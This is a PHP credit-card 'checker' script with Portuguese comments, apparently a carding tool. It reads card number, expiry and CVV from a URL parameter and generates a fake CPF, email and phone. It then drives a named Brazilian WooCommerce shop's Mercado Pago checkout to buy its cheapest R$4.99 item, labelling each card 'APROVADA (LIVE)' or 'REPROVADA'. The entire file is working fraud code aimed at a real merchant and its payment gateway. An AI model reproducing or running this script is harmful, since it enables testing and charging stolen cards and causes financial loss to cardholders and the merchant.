<?php
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');


// RECEBER DADOS DO CARTÃO AKI E O FAMOSO ?LISTA=CC/MM/AA/CVV ETC..

//  ______________________________________________________________________
// |                                                                          |
// |   _         __   ____  _    _  __   _        |
// |  / __| \ \   / / |  _ \ |  ____||   \  / ____||  ____| / ____|           |
// | | |       \ \_/ /  | |_)  |__   | |__)  (___  | |__   | |                |
// | | |        \   /   |  _ < |  |  |  _  /  \_ \ |  __|  | |                |
// | | |____     | |    | |_)  |____ | | \ \  ____)  |____ | |____            |
// |  \_____|    |_|    |____/ |______||_|  \_\|_____/ |______| \_____|       |
// |                                                                          |
// |                  >_ [@cybersecofc]                                       |
// |__________________________________________________________________________|

$lista = $_GET['lista'] ?? '';
$separar = explode("|", $lista);
$cc   = trim($separar[0] ?? '');
$mes  = trim($separar[1] ?? '');
$ano  = trim($separar[2] ?? '');
$cvv  = trim($separar[3] ?? '');

if (strlen($ano) == 2) $ano = "20" . $ano;
if (strlen($mes) == 1) $mes = '0' . $mes;

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    die("<span style='color:red;font-weight:bold;'>❌ REPROVADA</span> ➔ <b>$lista</b> ➔ Cartão Inválido<br>");
}

$inicio = microtime(true);


// CONFIGURAÇÕES DO SITE DEIXE AKI EM CIAM PARA VC NAO SE PERDER NO MEI DO CAMINHO 

$base = 'pessoalmarketing.com.br';
$public_key = 'APP_USR-cd80fe42-4a54-4886-8365-623eb8c12fd5';
$product_id = '8538'; // Produto mais barato: R$ 4,99 USE ESSE AKITANTO PAR AGG QUANTO PARA CC PARA DEBITAR VALORES MENORES 


// FUNÇÕES NESSESARIO PARA ALGUAMS API POIS AKI TEM CPF/GMAIL/ETC...

function gerarSessionId() {
    $chars = 'abcdef0123456789';
    $random = '';
    for ($i = 0; $i < 256; $i++) {
        $random .= $chars[mt_rand(0, 15)];
    }
    return 'armor.' . $random . '.' . dechex(time()) . dechex(mt_rand(100000, 999999));
}

function gerarCPF() {
    $n = [];
    for ($i = 0; $i < 9; $i++) $n[] = mt_rand(0, 9);
    $s = 0;
    for ($i = 0; $i < 9; $i++) $s += $n[$i] * (10 - $i);
    $r = $s % 11;
    $n[] = ($r < 2) ? 0 : 11 - $r;
    $s = 0;
    for ($i = 0; $i < 10; $i++) $s += $n[$i] * (11 - $i);
    $r = $s % 11;
    $n[] = ($r < 2) ? 0 : 11 - $r;
    return implode('', $n);
}

function detectarBandeira($cc) {
    $bin = substr($cc, 0, 6);
    if (preg_match('/^4[0-9]/', $bin)) return 'visa';
    if (preg_match('/^5[1-5][0-9]|^2[2-7][0-9]/', $bin)) return 'mastercard';
    if (preg_match('/^3[47][0-9]/', $bin)) return 'amex';
    if (preg_match('/^3(?:0[0-5]|[68])[0-9]/', $bin)) return 'diners';
    if (preg_match('/^6(?:011|5[0-9])/', $bin)) return 'discover';
    if (preg_match('/^(?:2131|1800|35[0-9])/', $bin)) return 'jcb';
    if (preg_match('/^5[0-9]/', $bin)) return 'mastercard';
    return 'mastercard';
}

function mapearBandeiraMP($bandeira) {
    $mapa = [
        'visa' => 'visa',
        'mastercard' => 'master',
        'amex' => 'amex',
        'diners' => 'diners',
        'discover' => 'discover',
        'jcb' => 'jcb',
    ];
    return $mapa[$bandeira] ?? 'master';
}


// DADOS DO CLIENTE AI VC USA AS FUNÇOES ACIAM Q TAMOS GERANDO

$cpf_raw = gerarCPF();
$cpf_formatado = substr($cpf_raw, 0, 3) . '.' . substr($cpf_raw, 3, 3) . '.' . substr($cpf_raw, 6, 3) . '-' . substr($cpf_raw, 9, 2);
$email = 'cliente' . mt_rand(1000, 9999) . '@gmail.com';
$nome = 'Cliente';
$sobrenome = 'Teste';
$telefone = '+55319' . mt_rand(10000000, 99999999);
$cep = '31155270';
$cidade = 'Belo Horizonte';
$estado = 'PR';
$rua = 'Rua Bonfim de Abreu';

$bandeira = detectarBandeira($cc);
$bandeira_mp = mapearBandeiraMP($bandeira);
$session_id = gerarSessionId();
$bin6 = substr($cc, 0, 6);

// VALOR FIXO: R$ 4,99 (produto mais barato)
$total_amount = '4.99';


// PASSO 1: PEGAR COOKIES INICIAIS AKI PARA EVITAR Q A API CAIA OK 

$cookie_file = tempnam(sys_get_temp_dir(), 'CK');

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$base/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_HTTPHEADER => [
        "Host: $base",
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    ],
    CURLOPT_TIMEOUT => 15,
]);
curl_exec($ch);
curl_close($ch);


// PASSO 2: ADICIONAR PRODUTO AO CARRINHO PARA EVITAR POBLEMAS NO CHECKOUT OK FIH DO SATNAS 

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$base/?wc-ajax=add_to_cart",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_POST => true,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_HTTPHEADER => [
        "Host: $base",
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With: XMLHttpRequest',
        "Origin: https://$base",
        "Referer: https://$base/finalizar-compra/",
    ],
    CURLOPT_POSTFIELDS => http_build_query([
        'product_sku' => '',
        'product_id' => $product_id,
        'quantity' => '1',
    ]),
    CURLOPT_TIMEOUT => 15,
]);
curl_exec($ch);
curl_close($ch);


// PASSO 3: VISITAR CHECKOUT AKI E ONDE VAI PARA A FASE DE PROCESSAR O PAGAMENTO

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$base/finalizar-compra/",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_HTTPHEADER => [
        "Host: $base",
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests: 1',
        "Referer: https://$base/produto-tag/promocao/",
    ],
    CURLOPT_TIMEOUT => 15,
]);
$checkout_page = curl_exec($ch);
curl_close($ch);

// Extrair nonce PARA PEGAR O RETONO TENDEU 
preg_match('/woocommerce-process-checkout-nonce[^>]+value="([^"]+)"/', $checkout_page, $nonce_match);
$checkout_nonce = $nonce_match[1] ?? '';

if (empty($checkout_nonce)) {
    preg_match('/"woocommerce-process-checkout-nonce":"([^"]+)"/', $checkout_page, $nonce_match2);
    $checkout_nonce = $nonce_match2[1] ?? '';
}

// Extrair security token NESCESARIO EXTRAIR ESSA POHA 
preg_match('/name="security"[^>]+value="([^"]+)"/', $checkout_page, $security_match);
$security_token = $security_match[1] ?? '';


// PASSO 4: UPDATE ORDER REVIEW PRECISA DESSA POHA TBM ESSA CARNIÇA

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$base/?wc-ajax=update_order_review",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_POST => true,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_HTTPHEADER => [
        "Host: $base",
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With: XMLHttpRequest',
        "Origin: https://$base",
        "Referer: https://$base/finalizar-compra/",
    ],
    CURLOPT_POSTFIELDS => http_build_query([
        'security' => $security_token,
        'payment_method' => 'woo-mercado-pago-custom',
        'country' => 'BR',
        'state' => $estado,
        'postcode' => $cep,
        'city' => $cidade,
        'address' => $rua,
        'address_2' => '',
        's_country' => 'BR',
        's_state' => $estado,
        's_postcode' => $cep,
        's_city' => $cidade,
        's_address' => $rua,
        's_address_2' => '',
        'has_full_address' => 'true',
        'post_data' => http_build_query([
            'billing_email' => $email,
            'billing_first_name' => $nome,
            'billing_last_name' => $sobrenome,
            'billing_country' => 'BR',
            'billing_address_1' => $rua,
            'billing_city' => $cidade,
            'billing_state' => $estado,
            'billing_postcode' => $cep,
            'billing_phone' => $telefone,
            'payment_method' => 'woo-mercado-pago-custom',
            'mercadopago_custom[amount]' => $total_amount,
            'mercadopago_custom[currency_ratio]' => '1',
            'mercadopago_custom[checkout_type]' => 'custom',
            'mercadopago_ticket[site_id]' => 'MLB',
            'mercadopago_ticket[amount]' => $total_amount,
            'mercadopago_ticket[currency_ratio]' => '1',
            'terms-field' => '1',
            'woocommerce-process-checkout-nonce' => $checkout_nonce,
            '_wp_http_referer' => '/finalizar-compra/',
        ]),
    ]),
    CURLOPT_TIMEOUT => 15,
]);
curl_exec($ch);
curl_close($ch);


// PASSO 5: BIN LOOKUP

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.mercadopago.com/v1/payment_methods/search?public_key=$public_key&locale=pt-BR&js_version=2.68.0&referer=https%3A%2F%2F$base&marketplace=NONE&status=active&product_id=BTR2N61O1F60OR8RLSGG&bins=$bin6&processing_mode=aggregator",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPHEADER => [
        'Host: api.mercadopago.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: */*',
        "Origin: https://$base",
        "Referer: https://$base/",
    ],
    CURLOPT_TIMEOUT => 15,
]);
$bin_info = curl_exec($ch);
curl_close($ch);

$bin_json = json_decode($bin_info, true);
if (empty($bin_json['results']) || !isset($bin_json['results'][0]['id'])) {
    $payment_method_id = $bandeira_mp;
} else {
    $payment_method_id = $bin_json['results'][0]['id'] ?? $bandeira_mp;
}


// PASSO 6: PARCELAS

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.mercadopago.com/v1/payment_methods/installments?public_key=$public_key&locale=pt-BR&js_version=2.68.0&referer=https%3A%2F%2F$base&bin=$bin6&processing_mode=aggregator&payment_type_id=credit_card&product_id=BTR2N61O1F60OR8RLSGG&amount=$total_amount",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPHEADER => [
        'Host: api.mercadopago.com',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: */*',
        "Origin: https://$base",
        "Referer: https://$base/",
    ],
    CURLOPT_TIMEOUT => 15,
]);
curl_exec($ch);
curl_close($ch);


// PASSO 7: TOKENIZAR CARTÃO AKI PARA EVITAR FALHAS NO PROCESAMENTO DO PAGAMENTO

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.mercadopago.com/v1/card_tokens?public_key=$public_key&locale=pt-BR&js_version=2.68.0&referer=https%3A%2F%2F$base",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_HTTPHEADER => [
        'Host: api.mercadopago.com',
        'x-product-id: C6N31CHL2KK4U8V6P7IG',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Content-Type: text/plain;charset=UTF-8',
        'Accept: */*',
        'Origin: https://secure-fields.mercadopago.com',
        'Referer: https://secure-fields.mercadopago.com/',
    ],
    CURLOPT_POSTFIELDS => json_encode([
        'card_number' => $cc,
        'cardholder' => [
            'name' => "$nome $sobrenome",
            'identification' => ['type' => 'CPF', 'number' => $cpf_raw],
        ],
        'security_code' => $cvv,
        'expiration_month' => $mes,
        'expiration_year' => $ano,
        'device' => ['meli' => ['session_id' => $session_id]],
    ]),
    CURLOPT_TIMEOUT => 20,
    CURLOPT_ENCODING => 'gzip',
]);
$token_resp = curl_exec($ch);
curl_close($ch);

$token_json = json_decode($token_resp, true);


// ANALISAR TOKENIZAÇÃO

if (!isset($token_json['id'])) {
    $erro = $token_json['message'] ?? ($token_json['error'] ?? 'Erro ao tokenizar');
    if (is_array($erro)) $erro = implode(' | ', $erro);
    
    $erro_lower = strtolower($erro);
    
    $fim = microtime(true);
    $tempo = number_format($fim - $inicio, 2);
    
    if (strpos($erro_lower, 'security_code') !== false || strpos($erro_lower, 'cvv') !== false) {
        die("<span style='color:#00ff00;font-weight:bold;font-size:16px;'>✅ APROVADA (LIVE - CVV Inválido)</span> ➔ <b>$lista</b> ➔ 💎 $bandeira ➔ 🔑 $erro ➔ ⏱ {$tempo}s<br>");
    }
    
    die("<span style='color:#ff0000;font-weight:bold;font-size:16px;'>❌ REPROVADA</span> ➔ <b>$lista</b> ➔ 💎 $bandeira ➔ ❌ $erro ➔ ⏱ {$tempo}s<br>");
}

$card_token = $token_json['id'];


// PASSO 8: CHECKOUT FINAL PARA RESCEBER OS RETONO 

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://$base/?wc-ajax=checkout",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_POST => true,
    CURLOPT_COOKIEJAR => $cookie_file,
    CURLOPT_COOKIEFILE => $cookie_file,
    CURLOPT_HTTPHEADER => [
        "Host: $base",
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With: XMLHttpRequest',
        "Origin: https://$base",
        "Referer: https://$base/finalizar-compra/",
    ],
    CURLOPT_POSTFIELDS => http_build_query([
        'billing_email' => $email,
        'billing_first_name' => $nome,
        'billing_last_name' => $sobrenome,
        'billing_country' => 'BR',
        'billing_address_1' => $rua,
        'billing_address_2' => '',
        'billing_city' => $cidade,
        'billing_state' => $estado,
        'billing_postcode' => $cep,
        'billing_phone' => $telefone,
        'order_comments' => '',
        'payment_method' => 'woo-mercado-pago-custom',
        'mp-card-holder-name' => "$nome $sobrenome",
        'identificationType' => 'CPF',
        'identificationNumber' => $cpf_formatado,
        'mp-installments' => '1',
        'installments' => '1',
        'mercadopago_custom[amount]' => $total_amount,
        'mercadopago_custom[currency_ratio]' => '1',
        'mercadopago_custom[payment_method_id]' => $payment_method_id,
        'mercadopago_custom[checkout_type]' => 'custom',
        'mercadopago_custom[token]' => $card_token,
        'mercadopago_custom[installments]' => '1',
        'mercadopago_custom[session_id]' => $session_id,
        'mercadopago_ticket[doc_type]' => 'CPF',
        'mercadopago_ticket[doc_number]' => '',
        'mercadopago_ticket[address_zip_code]' => '',
        'mercadopago_ticket[address_city]' => '',
        'mercadopago_ticket[address_neighborhood]' => '',
        'mercadopago_ticket[address_street_name]' => '',
        'mercadopago_ticket[address_street_number]' => '',
        'mercadopago_ticket[address_complement]' => '',
        'mercadopago_ticket[site_id]' => 'MLB',
        'mercadopago_ticket[amount]' => $total_amount,
        'mercadopago_ticket[currency_ratio]' => '1',
        'mercadopago_ticket[campaign_id]' => '',
        'mercadopago_ticket[campaign]' => '',
        'mercadopago_ticket[discount]' => '',
        'wc-stripe-payment-method-upe' => '',
        'wc_stripe_selected_upe_payment_type' => '',
        'wc-stripe-is-deferred-intent' => '1',
        'terms' => 'on',
        'terms-field' => '1',
        'woocommerce-process-checkout-nonce' => $checkout_nonce,
        '_wp_http_referer' => '/?wc-ajax=update_order_review',
        'MPHiddenInputToken' => $card_token,
        'MPHiddenInputPaymentMethod' => $payment_method_id,
        'MPHiddenInputProcessingMode' => 'aggregator',
        'MPHiddenInputMerchantAccountId' => '',
        'MPHiddenInputAmount' => $total_amount,
    ]),
    CURLOPT_TIMEOUT => 30,
    CURLOPT_ENCODING => 'gzip',
]);
$checkout_resp = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

@unlink($cookie_file);

$fim = microtime(true);
$tempo = number_format($fim - $inicio, 2);


// RESULTADO FINAL

$json_resp = json_decode($checkout_resp, true);

if ($json_resp) {
    $resultado = $json_resp['result'] ?? '';
    $mensagem = $json_resp['messages'] ?? '';
    if (is_array($mensagem)) $mensagem = implode(' | ', $mensagem);
    
    // ============ ÚNICO LIVE ============
    if ($resultado == 'success') {
        $order_id = $json_resp['order_id'] ?? '?';
        die("<span style='color:#00ff00;font-weight:bold;font-size:16px;'>✅ APROVADA (LIVE - R\$ $total_amount)</span> ➔ <b>$lista</b> ➔ 💎 $bandeira ➔ 🎯 Pedido #$order_id ➔ ⏱ {$tempo}s<br>");
    }
    
    // ============ TUDO RESTO = DIE ============
    $msg_final = !empty($mensagem) ? $mensagem : 'Transação recusada';
    die("<span style='color:#ff0000;font-weight:bold;font-size:16px;'>❌ REPROVADA</span> ➔ <b>$lista</b> ➔ 💎 $bandeira ➔ ❌ $msg_final ➔ ⏱ {$tempo}s<br>");
}

// Resposta HTML
if (strpos($checkout_resp, 'Thank you') !== false || strpos($checkout_resp, 'order has been received') !== false || strpos($checkout_resp, 'pedido-recebido') !== false) {
    die("<span style='color:#00ff00;font-weight:bold;font-size:16px;'>✅ APROVADA (LIVE - R\$ $total_amount)</span> ➔ <b>$lista</b> ➔ 💎 $bandeira ➔ ⏱ {$tempo}s<br>");
}

// Extrair erro HTML
$erro_html = '';
preg_match('/<ul class="woocommerce-error"[^>]*>(.*?)<\/ul>/s', $checkout_resp, $m);
if (!empty($m[1])) {
    $erro_html = strip_tags($m[1]);
    $erro_html = trim(preg_replace('/\s+/', ' ', $erro_html));
}

if (empty($erro_html)) {
    $erro_html = 'Transação recusada (HTTP ' . $http_code . ')';
}

die("<span style='color:#ff0000;font-weight:bold;font-size:16px;'>❌ REPROVADA</span> ➔ <b>$lista</b> ➔ 💎 $bandeira ➔ ❌ $erro_html ➔ ⏱ {$tempo}s<br>");
?>